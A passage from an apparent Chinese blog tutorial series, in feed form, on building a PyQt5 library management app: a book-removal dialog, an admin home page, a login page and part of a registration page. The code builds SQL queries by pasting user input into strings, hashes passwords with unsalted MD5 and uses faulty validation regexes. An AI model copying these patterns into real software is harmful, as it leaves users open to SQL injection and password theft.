self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setReadOnly(True)</span><br><span class="line">        self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setReadOnly(True)</span><br><span class="line">        self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.dropNumEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.dropBookButton.setFont(font)</span><br><span class="line">        self.dropBookButton.setFixedHeight(32)</span><br><span class="line">        self.dropBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line"></span><br><span class="line">        self.dropBookButton.clicked.connect(self.dropBookButtonClicked)</span><br><span class="line">        self.bookIdEdit.textChanged.connect(self.bookIdEditChanged)</span><br><span class="line"></span><br><span class="line">    def bookIdEditChanged(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        if (bookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            self.bookNameEdit.clear()</span><br><span class="line">            self.publisherEdit.clear()</span><br><span class="line">            self.authNameEdit.clear()</span><br><span class="line">            self.dropNumEdit.clear()</span><br><span class="line">            self.publishTime.clear()</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        # 查询对应书号，如果存在就更新form</span><br><span class="line">        if (query.next()):</span><br><span class="line">            self.bookNameEdit.setText(query.value(0))</span><br><span class="line">            self.authNameEdit.setText(query.value(2))</span><br><span class="line">            self.categoryComboBox.setCurrentText(query.value(3))</span><br><span class="line">            self.publisherEdit.setText(query.value(4))</span><br><span class="line">            self.publishTime.setText(query.value(5))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def dropBookButtonClicked(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        dropNum &#x3D; 0</span><br><span class="line">        if (self.dropNumEdit.text() &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;淘汰数目为空，请检查输入，操作失败&quot;), QMessageBox.Yes, QMessageBox.Yes)</span><br><span class="line">            return</span><br><span class="line">        dropNum &#x3D; int(self.dropNumEdit.text())</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next()):</span><br><span class="line">            if (dropNum &gt; query.value(7) or dropNum &lt; 0):</span><br><span class="line">                print(QMessageBox.warning(self, &quot;警告&quot;, &quot;最多可淘汰%d本，请检查输入&quot; % (query.value(7)), QMessageBox.Yes,</span><br><span class="line">                                          QMessageBox.Yes))</span><br><span class="line">                return</span><br><span class="line">        # 更新Book表和BuyorDrop表</span><br><span class="line">        # 如果drop书目和当前库存相同，则直接删除Book记录（这里先默认当前所有书都在库存中）</span><br><span class="line">        if (dropNum &#x3D;&#x3D; query.value(6)):</span><br><span class="line">            sql &#x3D; &quot;DELETE  FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        else:</span><br><span class="line">            sql &#x3D; &quot;UPDATE BOOK SET NumStorage&#x3D;NumStorage-%d,NumCanBorrow&#x3D;NumCanBorrow-%d WHERE BookId&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                dropNum, dropNum, bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        sql &#x3D; &quot;INSERT INTO buyordrop VALUES (&#39;%s&#39;,&#39;%s&#39;,0,%d)&quot; % (bookId, timenow, dropNum)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        print(QMessageBox.information(self, &quot;提示&quot;, &quot;淘汰书籍成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        self.drop_book_successful_signal.emit()</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; dropBookDialog()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><p>可以看到里面有两个函数，<code>bookIdEditChanged</code>和<code>dropBookButtonClicked</code></p><p>其中<code>bookIdEditChanged</code>用来实现实时监测是否填充信息<br><code>dropBookButtonClicked</code>实现点击淘汰的逻辑</p><p>当监测到书号的	<code>QLineEdit</code>被更改时触发<code>bookIdEditChanged</code>，从数据库检查是否存在该书，如果有则添加</p><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135546.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135551.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（4）——管理员主页设计</title>
    <url>/a8b56f4b.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>在管理员主页，为了完成初步的功能，即添加书本，淘汰书本，查看库存，我们需要设计以下：</p><ul><li>一个添加书本的Dialog，通过一个button启用</li><li>一个淘汰书本的Dialog，通过一个button启用</li><li>一个查看库存的Table， 一开始打算用一个button启用的，后来觉得直接放主页也挺好的，所以并没有用button启用（虽然依然放在设计中）</li></ul><a id="more"></a><h2><span id="pdai-ma">代码</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from addBookDialog import addBookDialog</span><br><span class="line">from dropBookDialog import dropBookDialog</span><br><span class="line">from BookStorageViewer import BookStorageViewer</span><br><span class="line">from UserManage import UserManage</span><br><span class="line"></span><br><span class="line">class AdminHome(QWidget):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.layout &#x3D; QHBoxLayout()</span><br><span class="line">        self.buttonlayout &#x3D; QVBoxLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.userManageButton &#x3D; QPushButton(&quot;用户管理&quot;)</span><br><span class="line">        self.addBookButton &#x3D; QPushButton(&quot;添加书籍&quot;)</span><br><span class="line">        self.dropBookButton &#x3D; QPushButton(&quot;淘汰书籍&quot;)</span><br><span class="line">        self.userManageButton.setFont(font)</span><br><span class="line">        self.addBookButton.setFont(font)</span><br><span class="line">        self.dropBookButton.setFont(font)</span><br><span class="line">        self.userManageButton.setFixedWidth(100)</span><br><span class="line">        self.userManageButton.setFixedHeight(42)</span><br><span class="line">        self.addBookButton.setFixedWidth(100)</span><br><span class="line">        self.addBookButton.setFixedHeight(42)</span><br><span class="line">        self.dropBookButton.setFixedWidth(100)</span><br><span class="line">        self.dropBookButton.setFixedHeight(42)</span><br><span class="line">        self.buttonlayout.addWidget(self.addBookButton)</span><br><span class="line">        self.buttonlayout.addWidget(self.dropBookButton)</span><br><span class="line">        self.buttonlayout.addWidget(self.userManageButton)</span><br><span class="line">        self.layout.addLayout(self.buttonlayout)</span><br><span class="line">        self.storageView &#x3D; BookStorageViewer()</span><br><span class="line">        self.layout.addWidget(self.storageView)</span><br><span class="line"></span><br><span class="line">        self.addBookButton.clicked.connect(self.addBookButtonClicked)</span><br><span class="line">        self.dropBookButton.clicked.connect(self.dropBookButtonClicked)</span><br><span class="line">        self.userManageButton.clicked.connect(self.userManage)</span><br><span class="line"></span><br><span class="line">    def addBookButtonClicked(self):</span><br><span class="line">        addDialog &#x3D; addBookDialog(self)</span><br><span class="line">        addDialog.add_book_success_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        addDialog.show()</span><br><span class="line">        addDialog.exec_()</span><br><span class="line"></span><br><span class="line">    def dropBookButtonClicked(self):</span><br><span class="line">        dropDialog &#x3D; dropBookDialog(self)</span><br><span class="line">        dropDialog.drop_book_successful_signal.connect(self.storageView.searchButtonClicked)</span><br><span class="line">        dropDialog.show()</span><br><span class="line">        dropDialog.exec_()</span><br><span class="line"></span><br><span class="line">    def userManage(self):</span><br><span class="line">        UserDelete&#x3D;UserManage(self)</span><br><span class="line">        UserDelete.show()</span><br><span class="line">        UserDelete.exec_()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; AdminHome()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><blockquote><p>整段代码非常简短，逻辑也很清晰。<br>1、在setUpUI中有一个淘汰的button，一个添加的button<br>2、使用信号与槽机制，当点击添加按钮时，启用addBookDialog，点击淘汰按钮时，启用dropBookDialog<br>3、主页还有一个BookStorageViewer用于查看库存<br>**注意：**两个diolog和一个Table，我会在接下来的blog中给出</p></blockquote><h2><span id="pxiao-guo">效果</span><a href="#pxiao-guo" class="header-anchor">#</a></h2><p>虽然代码还不全，但也先看看最后效果吧~<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135518.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135524.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（3）——登录页面设计</title>
    <url>/98a38c48.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>登录页面的逻辑很简单，如下：</p><ul><li>用户输入学号和密码（安全起见，加上输入检测）</li><li>如果密码错误或者用户名不存在，则给出提示</li><li>如果正确，则进行跳转</li></ul><a id="more"></a><h2><span id="pdai-ma">代码：</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import hashlib</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SignInWidget(QWidget):</span><br><span class="line">    is_admin_signal &#x3D; pyqtSignal()</span><br><span class="line">    is_student_signal &#x3D; pyqtSignal(str)</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        super(SignInWidget, self).__init__()</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.Vlayout &#x3D; QVBoxLayout(self)</span><br><span class="line">        self.Hlayout1 &#x3D; QHBoxLayout()</span><br><span class="line">        self.Hlayout2 &#x3D; QHBoxLayout()</span><br><span class="line">        self.formlayout &#x3D; QFormLayout()</span><br><span class="line"></span><br><span class="line">        self.label1 &#x3D; QLabel(&quot;学号: &quot;)</span><br><span class="line">        labelFont &#x3D; QFont()</span><br><span class="line">        labelFont.setPixelSize(18)</span><br><span class="line">        lineEditFont &#x3D; QFont()</span><br><span class="line">        lineEditFont.setPixelSize(16)</span><br><span class="line">        self.label1.setFont(labelFont)</span><br><span class="line">        self.lineEdit1 &#x3D; QLineEdit()</span><br><span class="line">        self.lineEdit1.setFixedHeight(32)</span><br><span class="line">        self.lineEdit1.setFixedWidth(180)</span><br><span class="line">        self.lineEdit1.setFont(lineEditFont)</span><br><span class="line">        self.lineEdit1.setMaxLength(10)</span><br><span class="line"></span><br><span class="line">        self.formlayout.addRow(self.label1, self.lineEdit1)</span><br><span class="line"></span><br><span class="line">        self.label2 &#x3D; QLabel(&quot;密码: &quot;)</span><br><span class="line">        self.label2.setFont(labelFont)</span><br><span class="line">        self.lineEdit2 &#x3D; QLineEdit()</span><br><span class="line">        self.lineEdit2.setFixedHeight(32)</span><br><span class="line">        self.lineEdit2.setFixedWidth(180)</span><br><span class="line">        self.lineEdit2.setMaxLength(16)</span><br><span class="line"></span><br><span class="line">        # 设置验证</span><br><span class="line">        reg &#x3D; QRegExp(&quot;PB[0~9]&#123;8&#125;&quot;)</span><br><span class="line">        pValidator &#x3D; QRegExpValidator(self)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.lineEdit1.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        reg &#x3D; QRegExp(&quot;[a-zA-z0-9]+$&quot;)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.lineEdit2.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        passwordFont &#x3D; QFont()</span><br><span class="line">        passwordFont.setPixelSize(10)</span><br><span class="line">        self.lineEdit2.setFont(passwordFont)</span><br><span class="line"></span><br><span class="line">        self.lineEdit2.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.formlayout.addRow(self.label2, self.lineEdit2)</span><br><span class="line">        self.signIn &#x3D; QPushButton(&quot;登 录&quot;)</span><br><span class="line">        self.signIn.setFixedWidth(80)</span><br><span class="line">        self.signIn.setFixedHeight(30)</span><br><span class="line">        self.signIn.setFont(labelFont)</span><br><span class="line">        self.formlayout.addRow(&quot;&quot;, self.signIn)</span><br><span class="line"></span><br><span class="line">        self.label &#x3D; QLabel(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        fontlabel &#x3D; QFont()</span><br><span class="line">        fontlabel.setPixelSize(30)</span><br><span class="line">        self.label.setFixedWidth(390)</span><br><span class="line">        # self.label.setFixedHeight(80)</span><br><span class="line">        self.label.setFont(fontlabel)</span><br><span class="line">        self.Hlayout1.addWidget(self.label, Qt.AlignCenter)</span><br><span class="line">        self.widget1 &#x3D; QWidget()</span><br><span class="line">        self.widget1.setLayout(self.Hlayout1)</span><br><span class="line">        self.widget2 &#x3D; QWidget()</span><br><span class="line">        self.widget2.setFixedWidth(300)</span><br><span class="line">        self.widget2.setFixedHeight(150)</span><br><span class="line">        self.widget2.setLayout(self.formlayout)</span><br><span class="line">        self.Hlayout2.addWidget(self.widget2, Qt.AlignCenter)</span><br><span class="line">        self.widget &#x3D; QWidget()</span><br><span class="line">        self.widget.setLayout(self.Hlayout2)</span><br><span class="line">        self.Vlayout.addWidget(self.widget1)</span><br><span class="line">        self.Vlayout.addWidget(self.widget, Qt.AlignTop)</span><br><span class="line"></span><br><span class="line">        self.signIn.clicked.connect(self.signInCheck)</span><br><span class="line">        self.lineEdit2.returnPressed.connect(self.signInCheck)</span><br><span class="line">        self.lineEdit1.returnPressed.connect(self.signInCheck)</span><br><span class="line"></span><br><span class="line">    def signInCheck(self):</span><br><span class="line">        studentId &#x3D; self.lineEdit1.text()</span><br><span class="line">        password &#x3D; self.lineEdit2.text()</span><br><span class="line">        if (studentId &#x3D;&#x3D; &quot;&quot; or password &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;学号和密码不可为空!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 打开数据库连接</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM user WHERE StudentId&#x3D;&#39;%s&#39;&quot; % (studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line">        hl &#x3D; hashlib.md5()</span><br><span class="line">        hl.update(password.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.information(self, &quot;提示&quot;, &quot;该账号不存在!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        else:</span><br><span class="line">            if (studentId &#x3D;&#x3D; query.value(0) and hl.hexdigest() &#x3D;&#x3D; query.value(2)):</span><br><span class="line">                # 如果是管理员</span><br><span class="line">                if (query.value(3)&#x3D;&#x3D;1):</span><br><span class="line">                    self.is_admin_signal.emit()</span><br><span class="line">                else:</span><br><span class="line">                    self.is_student_signal.emit(studentId)</span><br><span class="line">            else:</span><br><span class="line">                print(QMessageBox.information(self, &quot;提示&quot;, &quot;密码错误!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; SignInWidget()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pxiao-guo-ru-xia">效果如下</span><a href="#pxiao-guo-ru-xia" class="header-anchor">#</a></h2><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135454.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135500.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135505.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（2）——注册页面设计</title>
    <url>/72587310.html</url>
    <content><![CDATA[<blockquote><p>我觉得最cd的就是QtDesigner虽然适合快速开发UI，但是我总用不好，只能纯代码来实现界面了。现在大家能看到的一开始的UI设计和一点逻辑，并不包含总体应用的的逻辑体系</p></blockquote><a id="more"></a><h2><span id="pdai-ma">代码：</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SignUpWidget(QWidget):</span><br><span class="line">    student_signup_signal &#x3D; pyqtSignal(str)</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.resize(900, 600)</span><br><span class="line">        self.setWindowTitle(&quot;欢迎登陆图书馆管理系统&quot;)</span><br><span class="line">        self.signUpLabel &#x3D; QLabel(&quot;注   册&quot;)</span><br><span class="line">        self.signUpLabel.setAlignment(Qt.AlignCenter)</span><br><span class="line">        # self.signUpLabel.setFixedWidth(300)</span><br><span class="line">        self.signUpLabel.setFixedHeight(100)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(36)</span><br><span class="line">        lineEditFont &#x3D; QFont()</span><br><span class="line">        lineEditFont.setPixelSize(16)</span><br><span class="line">        self.signUpLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.layout &#x3D; QVBoxLayout()</span><br><span class="line">        self.layout.addWidget(self.signUpLabel, Qt.AlignHCenter)</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line">        # 表单，包括学号，姓名，密码，确认密码</span><br><span class="line">        self.formlayout &#x3D; QFormLayout()</span><br><span class="line">        font.setPixelSize(18)</span><br><span class="line">        # Row1</span><br><span class="line">        self.studentIdLabel &#x3D; QLabel(&quot;学    号: &quot;)</span><br><span class="line">        self.studentIdLabel.setFont(font)</span><br><span class="line">        self.studentIdLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.studentIdLineEdit.setFixedWidth(180)</span><br><span class="line">        self.studentIdLineEdit.setFixedHeight(32)</span><br><span class="line">        self.studentIdLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.studentIdLineEdit.setMaxLength(10)</span><br><span class="line">        self.formlayout.addRow(self.studentIdLabel, self.studentIdLineEdit)</span><br><span class="line"></span><br><span class="line">        # Row2</span><br><span class="line">        self.studentNameLabel &#x3D; QLabel(&quot;姓    名: &quot;)</span><br><span class="line">        self.studentNameLabel.setFont(font)</span><br><span class="line">        self.studentNameLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.studentNameLineEdit.setFixedHeight(32)</span><br><span class="line">        self.studentNameLineEdit.setFixedWidth(180)</span><br><span class="line">        self.studentNameLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.studentNameLineEdit.setMaxLength(10)</span><br><span class="line">        self.formlayout.addRow(self.studentNameLabel, self.studentNameLineEdit)</span><br><span class="line"></span><br><span class="line">        lineEditFont.setPixelSize(10)</span><br><span class="line"></span><br><span class="line">        # Row3</span><br><span class="line">        self.passwordLabel &#x3D; QLabel(&quot;密    码: &quot;)</span><br><span class="line">        self.passwordLabel.setFont(font)</span><br><span class="line">        self.passwordLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.passwordLineEdit.setFixedWidth(180)</span><br><span class="line">        self.passwordLineEdit.setFixedHeight(32)</span><br><span class="line">        self.passwordLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.passwordLineEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.passwordLineEdit.setMaxLength(16)</span><br><span class="line">        self.formlayout.addRow(self.passwordLabel, self.passwordLineEdit)</span><br><span class="line"></span><br><span class="line">        # Row4</span><br><span class="line">        self.passwordConfirmLabel &#x3D; QLabel(&quot;确认密码: &quot;)</span><br><span class="line">        self.passwordConfirmLabel.setFont(font)</span><br><span class="line">        self.passwordConfirmLineEdit &#x3D; QLineEdit()</span><br><span class="line">        self.passwordConfirmLineEdit.setFixedWidth(180)</span><br><span class="line">        self.passwordConfirmLineEdit.setFixedHeight(32)</span><br><span class="line">        self.passwordConfirmLineEdit.setFont(lineEditFont)</span><br><span class="line">        self.passwordConfirmLineEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.passwordConfirmLineEdit.setMaxLength(16)</span><br><span class="line">        self.formlayout.addRow(self.passwordConfirmLabel, self.passwordConfirmLineEdit)</span><br><span class="line"></span><br><span class="line">        # Row5</span><br><span class="line">        self.signUpbutton &#x3D; QPushButton(&quot;注 册&quot;)</span><br><span class="line">        self.signUpbutton.setFixedWidth(120)</span><br><span class="line">        self.signUpbutton.setFixedHeight(30)</span><br><span class="line">        self.signUpbutton.setFont(font)</span><br><span class="line">        self.formlayout.addRow(&quot;&quot;, self.signUpbutton)</span><br><span class="line">        widget &#x3D; QWidget()</span><br><span class="line">        widget.setLayout(self.formlayout)</span><br><span class="line">        widget.setFixedHeight(250)</span><br><span class="line">        widget.setFixedWidth(300)</span><br><span class="line">        self.Hlayout &#x3D; QHBoxLayout()</span><br><span class="line">        self.Hlayout.addWidget(widget, Qt.AlignCenter)</span><br><span class="line">        widget &#x3D; QWidget()</span><br><span class="line">        widget.setLayout(self.Hlayout)</span><br><span class="line">        self.layout.addWidget(widget, Qt.AlignHCenter)</span><br><span class="line"></span><br><span class="line">        # 设置验证</span><br><span class="line">        reg &#x3D; QRegExp(&quot;PB[0~9]&#123;8&#125;&quot;)</span><br><span class="line">        pValidator &#x3D; QRegExpValidator(self)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.studentIdLineEdit.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        reg &#x3D; QRegExp(&quot;[a-zA-z0-9]+$&quot;)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.passwordLineEdit.setValidator(pValidator)</span><br><span class="line">        self.passwordConfirmLineEdit.setValidator(pValidator)</span><br><span class="line">        self.signUpbutton.clicked.connect(self.SignUp)</span><br><span class="line">        self.studentIdLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line">        self.studentNameLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line">        self.passwordLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line">        self.passwordConfirmLineEdit.returnPressed.connect(self.SignUp)</span><br><span class="line"></span><br><span class="line">    def SignUp(self):</span><br><span class="line">        studentId &#x3D; self.studentIdLineEdit.text()</span><br><span class="line">        studentName &#x3D; self.studentNameLineEdit.text()</span><br><span class="line">        password &#x3D; self.passwordLineEdit.text()</span><br><span class="line">        confirmPassword &#x3D; self.passwordConfirmLineEdit.text()</span><br><span class="line">        if (studentId &#x3D;&#x3D; &quot;&quot; or studentName &#x3D;&#x3D; &quot;&quot; or password &#x3D;&#x3D; &quot;&quot; or confirmPassword &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;表单不可为空，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        else:  # 需要处理逻辑，1.账号已存在;2.密码不匹配;3.插入user表</span><br><span class="line">            db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">            db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">            db.open()</span><br><span class="line">            query &#x3D; QSqlQuery()</span><br><span class="line">            if (confirmPassword !&#x3D; password):</span><br><span class="line">                print(QMessageBox.warning(self, &quot;警告&quot;, &quot;两次输入密码不一致，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">                return</span><br><span class="line">            elif (confirmPassword &#x3D;&#x3D; password):</span><br><span class="line">                # md5编码</span><br><span class="line">                